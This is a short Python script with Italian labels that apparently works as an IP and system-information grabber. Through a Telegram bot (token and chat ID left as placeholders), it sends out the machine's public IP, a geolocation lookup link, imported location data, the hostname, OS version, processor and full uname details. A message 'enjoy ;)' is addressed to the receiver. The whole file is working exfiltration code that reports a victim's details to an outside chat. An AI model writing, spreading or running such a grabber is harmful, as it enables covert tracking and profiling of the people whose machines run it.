from test import ip
from IP_data import data
import telepot
import platform

enjoy="enjoy ;)"

TOKEN="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
chat_id="xxxxxxxxxx"

the_location_zone = "---------------localizzation---------------"



bot=telepot.Bot(TOKEN)
bot.sendMessage(chat_id,ip )
bot.sendMessage(chat_id,'https://whatismyipaddress.com/' + ip )
bot.sendMessage(chat_id,enjoy)
bot.sendMessage(chat_id,the_location_zone)
bot.sendMessage(chat_id,data)
bot.sendMessage(chat_id,"--------------os-------------")
bot.sendMessage(chat_id,"python version [] " + platform.python_version())
bot.sendMessage(chat_id,"system [] " + platform.system())
bot.sendMessage(chat_id,"versione [] " + platform.version())
bot.sendMessage(chat_id,"rilascio [] " + platform.release())
bot.sendMessage(chat_id,"macchina [] " + platform.machine())
bot.sendMessage(chat_id,"processore [] " + platform.processor())
bot.sendMessage(chat_id,"nome desktop [] " + platform.node())
bot.sendMessage(chat_id,"piattaforma [] " + platform.platform())
bot.sendMessage(chat_id,platform.uname())